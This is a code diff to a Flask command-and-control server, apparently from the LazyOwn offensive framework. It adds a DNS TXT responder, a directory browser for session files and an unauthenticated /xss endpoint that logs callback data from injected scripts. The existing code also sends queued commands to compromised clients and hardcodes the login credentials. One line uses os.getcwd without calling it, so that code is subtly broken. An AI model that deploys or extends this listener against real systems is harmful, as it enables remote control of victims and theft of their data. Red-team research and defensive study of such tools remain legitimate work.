@@ -1,15 +1,18 @@
-from flask import Flask, request, render_template, redirect, url_for, jsonify, Response
 import re
 import os
+import sys
 import json
 import socket
+import logging
 import threading
-import sys
 from functools import wraps
-
+from dnslib.dns import RR, QTYPE, TXT
+from dnslib.server import DNSServer, DNSLogger
+from flask import Flask, request, render_template, redirect, url_for, jsonify, Response
 
 USERNAME = 'LazyOwn'
 PASSWORD = 'LazyOwn'
+BASE_DIR = os.path.abspath("../sessions")  
 
 if len(sys.argv) > 1:
     lport = sys.argv[1]
@@ -44,10 +47,75 @@ def requires_auth(f):
         return f(*args, **kwargs)
     return decorated
 
+def start_dns_server():
+    """
+    Inicia un servidor DNS que responde con un registro TXT específico.
+    """
+    class CustomDNSResolver:
+        def resolve(self, request, handler):
+            reply = request.reply()
+            qname = request.q.qname
+            if str(qname) == "info.lazyown.com.":
+                reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT("http://lazyown.com/info")))
+            else:
+                reply.header.rcode = 3  
+            return reply
+
+    resolver = CustomDNSResolver()
+    logger = DNSLogger(prefix=False)
+    server = DNSServer(resolver, port=53, address="0.0.0.0", logger=logger)
+    print("    [*] Server DNS started at port 53.")
+    server.start()
+
 @app.route('/')
 @requires_auth
 def index():
     return render_template('index.html', connected_clients=connected_clients, results=results)
+
+
+@app.route('/browse', methods=['GET'])
+def browse_files():
+    subdir = request.args.get('dir', '')
+    current_path = os.path.abspath(os.path.join(BASE_DIR, subdir))
+
+    
+    if not current_path.startswith(BASE_DIR):
+        return "Access to this directory is not allowed", 403
+
+    
+    if not os.path.exists(current_path) or not os.path.isdir(current_path):
+        return "Directory does not exist", 404
+
+
+        
+    entries = []
+    for entry in os.listdir(current_path):
+        entry_path = os.path.join(current_path, entry)
+        entries.append({
+            "name": entry,
+            "is_directory": os.path.isdir(entry_path),
+            "path": os.path.join(subdir, entry) if subdir else entry
+        })
+
+    
+    return render_template('browse.html', current_path=current_path, entries=entries, parent=subdir.rsplit('/', 1)[0] if '/' in subdir else '')
+
+
+
+@app.route('/xss', methods=['GET'])
+def xss():
+    params = request.args
+    if params:
+        path = os.getcwd
+        log_dir = f"{path}/../sessions"
+        if not os.path.exists(log_dir):
+            os.makedirs(log_dir)
+        log_file = os.path.join(log_dir, "xss.log")
+        logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s - %(message)s')
+        logging.info(f"XSS Exec with params: {params}")
+        return "XSS report", 200
+
+    return "No data received", 400
 
 @app.route('/command/<client_id>', methods=['GET'])
 def send_command(client_id):
@@ -55,6 +123,7 @@ def send_command(client_id):
     if client_id in commands:
         command = commands.pop(client_id)
         print(f"[INFO] Sending command to {client_id}: {command}")
+
         return command, 200 
     return '', 204
 
@@ -207,6 +276,8 @@ def secure_filename(filename):
 if __name__ == '__main__':
     path = os.getcwd().replace("modules", "sessions" )
     uploads = f"{path}/uploads"
+    dns_thread = threading.Thread(target=start_dns_server, daemon=True)
+    dns_thread.start()
     if not os.path.exists(uploads):
         os.makedirs(uploads)  
     app.run(host='0.0.0.0', port=lport)
